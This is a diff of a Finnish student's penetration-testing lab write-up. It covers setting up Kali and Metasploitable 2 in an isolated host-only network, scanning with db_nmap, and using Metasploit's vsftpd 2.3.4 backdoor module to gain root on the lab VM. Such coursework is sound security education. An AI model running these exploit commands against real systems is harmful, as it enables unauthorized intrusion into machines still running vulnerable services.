@@ -78,32 +78,29 @@ Lähde: rikurikurikuriku, H2 Turbo Mode, b), GitHub,  https://github.com/rikurik
 
 
 ## a) Asenna Kali virtuaalikoneeseen
-Asennan Kali Linux -käyttöjärjestelmän VirtualBoxiin. Minulla on on valmiiksi ladattu Kali Linux 2023.2a iso-tiedosto (todettu toimivaksi omassa Macissani), jota käytän tehtävässä. Tiedosto peräisin kali.org. Annan koneelle seuraavat speksit:
+Asennan Kali Linux -käyttöjärjestelmän VirtualBoxiin. Minulla on on valmiiksi ladattu Kali Linux 2023.2a iso-tiedosto (todettu toimivaksi omassa Macissani UTM-ohjelmiston kanssa), jota käytän tehtävässä. Tiedosto peräisin [kali.org](https://www.kali.org/). Annan virtuaalikoneelle seuraavat speksit:
 
 - Base Memory: 4096 MB
 - Processors: 4
 - Disk Size: 50,00 GB
 
-Asennus näytti edistyvän normaalisti, mutta bootatessa ruutu oli musta ja siinä välkkyi valkoinen kursori. Boottaus ei edennyt. Minulla on ollut aikaisemmin sama ongelma VirtualBoxin kanssa.
-
+Asennus näytti edistyvän normaalisti, mutta bootatessa ruutu oli musta ja siinä välkkyi valkoinen kursori. Boottaus ei edennyt. Minulla on ollut aikaisemmin sama ongelma VirtualBoxin kanssa, enkä ole ratkaissut mistä ongelma johtuu. Seuraavissa tehtävissä läytän valmiiksi asennettua Kali Linuxia.
 
 ## b) Asenna Metasploitable 2 virtuaalikoneeseen
-Menin ohjeiden mukaan: https://docs.rapid7.com/metasploit/metasploitable-2/
-Latasin sen täältä: https://sourceforge.net/projects/metasploitable
 
-Asensin https://www.youtube.com/watch?v=E3IJ_d3rAgA
+Latasin tiedoston [täältä](https://sourceforge.net/projects/metasploitable).
 
-Valitsin Host-ONly network
-käynnistin koneen ja kirjauduin sisään.
+Koska Kalin asennus VirtualBoxiin ei onnistunut, halusin myös Metasploitable asentaa UTM:ään. Käytin asennuksessa apuna Youtube-videosta [How to install Metasploitable on a Macbook with an M1 Chip](https://www.youtube.com/watch?v=E3IJ_d3rAgA). Vaikka video neuvoo asennuksen M1-koneille, toimi kyseinen asennus myös vanhemmalle Applen Macbookille.
+
+Valitsin Network Modeksi "Host-Only". Käynnistin koneen ja kirjauduin sisään.
 <img src="/images/msf1.png" alt="" title="" width="70%" height="70%">
-
 
 ## c) Tee koneille virtuaaliverkko, jossa
 - Kali saa yhteyden Internettiin, mutta sen voi laittaa pois päältä
 - Kalin ja Metasploitablen välillä on host-only network, niin että porttiskannatessa ym. koneet on eristetty intenetistä, mutta ne saavat yhteyden toisiinsa
 - Osoita eri komennoilla, että Internet-yhteys katkeaa: 'ping 1.1.1.1', 'ping www.google.com', 'curl www.google.com'
 
-UTM-virtualisointiohjelmasta olen valinnut molempiin virtuali koneisiin Host-Only -vaihtoehdon. Tällä hetkellä Kali eikä Metasploitable ole yhteydessä internetiin ja testin suoritin eri komennoilla.
+UTM-virtualisointiohjelmasta olen valinnut molempiin virtuaalikoneisiin Host-Only -vaihtoehdon. Tällä hetkellä Kali eikä Metasploitable ole yhteydessä internetiin. Testasin, etteivät koneet ole yhteydessä internettiin eri komennoilla.
 Kali:
 <img src="/images/testi1.png" alt="" title="" width="70%" height="70%">
 Metasploitable:
@@ -114,21 +111,18 @@ Pingasin koneilla myös toisiaan testatakseni, että yhteys toisiinsa löytyy.
 <img src="/images/testi2.png" alt="" title="" width="70%" height="70%">
 <img src="/images/testi3.png" alt="" title="" width="70%" height="70%">
 
-
 ## d) Etsi Metasploitable porttiskannaamalla (db_nmap -sn). Tarkista selaimella, että löysit oikean IP:n - Metasploitablen weppipalvelimen etusivulla lukee Metasploitable. Katso, ettei skannauspaketteja vuoda Internetiin - kannattaa irrottaa koneet netistä skannatessa.
 
-Käynnistin Metasploitablen tarvitseman tietokannan komennolla <code>sudo systemctl start postgresql</code>. Seuraavaksi annoin komennon <code>sudo msfdb init</code>, mikä käynnistää PostgreSQL-tietokannan ja suorittaa alustavat konfiguraatiot sekä asettaa ympäristömuuttujat ja luo tarvittavat tiedostot ja hakemistot. Avasin Metasploit Framework- työkalun komennolla <code>msfconsole</code>. Sen jälkeen annoin komennon <code>db_nmap -sn 192.168.12.3</code>, joka suorittaa Nmap ping-skannauksen määritettyyn IP-osoitteeseen ja päivittää tiedot Metasploit-tietokantaan. <code>-sn</code>-vaihtoehto ohjeistaa Nmapia suorittamaan host discovery -skannauksen ilman itse palvelun porttien tai palveluiden skannausta.
+Käynnistin Metasploitablen tarvitseman tietokannan komennolla <code>sudo systemctl start postgresql</code>. Seuraavaksi annoin komennon <code>sudo msfdb init</code>, mikä käynnistää PostgreSQL-tietokannan ja suorittaa alustavat konfiguraatiot sekä asettaa ympäristömuuttujat ja luo tarvittavat tiedostot ja hakemistot. Avasin Metasploit Framework- työkalun komennolla <code>msfconsole</code>. Sen jälkeen annoin komennon <code>db_nmap -sn 192.168.12.3</code>, joka suorittaa Nmap ping-skannauksen määritettyyn IP-osoitteeseen (Metasploitable-koneeseen) ja päivittää tiedot Metasploit-tietokantaan. <code>-sn</code>-vaihtoehto ohjeistaa Nmapia suorittamaan host discovery -skannauksen ilman itse palvelun porttien tai palveluiden skannausta.
 
 <img src="/images/msf4.png" alt="" title="" width="70%" height="70%">
 <img src="/images/msfsivu.png" alt="" title="" width="70%" height="70%">
 
-Käytin apuna: https://github.com/vilppuuu/tunkeutumistestaus/blob/main/h2_laksyt.md
-
 ## e) Porttiskannaa Metasploitable huolellisesti (db_nmap -A -p0-). Analysoi tulos. Kerro myös ammatillinen mielipiteesi (uusi, vanha, tavallinen, erikoinen), jos jokin herättää ajatuksia.
 Skannasin Metasploitablen komennolla <code>db_nmap -A -p0- 192.168.12.3</code>.
 
--<code>A</code>: Suorittaa aggressiivisen skannauksen, joka sisältää käyttöjärjestelmän havaitsemisen, versiotietojen keräämisen, palveluiden tunnistamisen, sekä muita yksityiskohtaisia tietoja.
--<code>-p0-</code>: Skannaa kaikki portit nollasta eteenpäin.
+- <code>A</code>: Suorittaa aggressiivisen skannauksen, joka sisältää käyttöjärjestelmän havaitsemisen, versiotietojen keräämisen, palveluiden tunnistamisen, sekä muita yksityiskohtaisia tietoja.
+- <code>-p0-</code>: Skannaa kaikki portit nollasta eteenpäin.
 
 <img src="/images/dbnmap.png" alt="" title="" width="70%" height="70%">
 
@@ -140,7 +134,7 @@ Tulostus oli pitkä. Tämä tarkoittaa, että avoimia portteja ja palveluja on k
 
 ## f) Murtaudu Metasploitablen VsFtpd-palveluun Metasploitilla (search vsftpd, use 0, set RHOSTS - varmista osoite huolella, exploit, id)
 
-<code>db_nmap -sV -p 21 192.168.12.3</code>
+Suoritin ensimmäiseksi verioskannauksen porttiin 21.
 
 `````
 msf6 > db_nmap -sV -p 21 192.168.12.3
@@ -153,9 +147,8 @@ msf6 > db_nmap -sV -p 21 192.168.12.3
 [*] Nmap: Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 [*] Nmap: Nmap done: 1 IP address (1 host up) scanned in 13.36 seconds
 `````
-Skannauksesta näemme, että käytössä on versio vsftpd 2.3.4. 
-
-<code>search vsftpd</code> ja backdoor-moduuli versiolle 2.3.4 löytyi. Käytämme sitä komennolla: <code>use exploit/unix/ftp/vsftpd_234_backdoor</code>.
+Skannauksesta näemme, että käytössä on VsFtpd versio 2.3.4. Voimme käyttää tätä tietoa hyväksi exploitin etsimisessä. 
+Komennolla <code>search vsftpd</code> backdoor-moduuli versiolle 2.3.4 löytyi. Käytän moduulia päästäkseni kirjautumaan sisälle kohteeseen:
 
 ````
 msf6 > use exploit/unix/ftp/vsftpd_234_backdoor
@@ -164,7 +157,7 @@ msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set rhosts 192.168.12.3
 rhosts => 192.168.12.3
 msf6 exploit(unix/ftp/vsftpd_234_backdoor) > exploit
 ````
-Ja yhteys on luotu ja kirjauduttu root-käyttäjänä.
+Yhteys on luotu ja kirjauduttu root-käyttäjänä.
 
 <img src="/images/exploit1.png" alt="" title="" width="70%" height="70%">
 <img src="/images/exploit2.png" alt="" title="" width="70%" height="70%">
@@ -180,6 +173,7 @@ Loin uuden käyttäjän "user1" komennolla <code>sudo adduser user1</code>. Skip
 Unable to negotiate with 192.168.12.3 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss
 ````
 ChatGPT auttoi neuvomaan kokeilemaan seuraavaa komentoa: <code>ssh -oHostKeyAlgorithms=+ssh-rsa user1@192.168.12.3</code> ja pääsin sillä kirjautumaan käyttäjälleni. 
+
 <img src="/images/user.png" alt="" title="" width="70%" height="70%">
 
 ChatGPT:n mukaan: "Virheilmoituksesi "Unable to negotiate with 192.168.12.3 port 22: no matching host key type found. Their offer: ssh-rsa,ssh-dss" viittaa siihen, että SSH-asiakas ei löytänyt yhteensopivaa avaintyyppiä, kun yritettiin neuvotella SSH-yhteyttä palvelimen kanssa.Tämä voi johtua siitä, että SSH-palvelin tukee avaintyyppejä, joita SSH-asiakkaasi ei tue. Voit yrittää ratkaista tämän ongelman lisäämällä -o-vaihtoehdon käyttäen HostKeyAlgorithms-määritystä. <code>ssh -oHostKeyAlgorithms=+ssh-rsa user1@192.168.12.3</code> -komento määrää käyttämään ssh-rsa-avaintyyppiä neuvotteluissa."
@@ -187,6 +181,7 @@ ChatGPT:n mukaan: "Virheilmoituksesi "Unable to negotiate with 192.168.12.3 port
 
 ## h) Etsi, tutki ja kuvaile jokin hyökkäys ExploitDB:sta. (Tässä harjoitustehtävässä pitää hakea ja kuvailla hyökkäys, itse hyökkääminen jää vapaaehtoiseksi lisätehtäväksi)
 
+Kesken.
 
 ## i) Etsi, tutki ja kuvaile hyökkäys 'searchsploit' -komennolla. Muista päivittää. (Tässä harjoitustehtävässä pitää hakea ja kuvailla hyökkäys, itse hyökkääminen jää vapaaehtoiseksi lisätehtäväksi. Valitse eri hyökkäys kuin edellisessä kohdassa.)
 ## j) Kokeile vapaavalintaista haavoittuvuusskanneria johonkin Metasploitablen palveluun. (Esim. nikto, wpscan, openvas, nessus, nucleus tai joku muu)
@@ -203,6 +198,8 @@ Karvinen, Tero: Oppitunnit 2023-11-06, Tunkeutumistestaus, h2-Lab Kid (https://t
 https://learning.oreilly.com/library/view/mastering-kali-linux/9781801819770/Text/Chapter_10.xhtml#_idParaDest-249
 
 https://0xdf.gitlab.io/2023/11/09/htb-broker.html
+
+https://github.com/vilppuuu/tunkeutumistestaus/blob/main/h2_laksyt.md
 
 
 
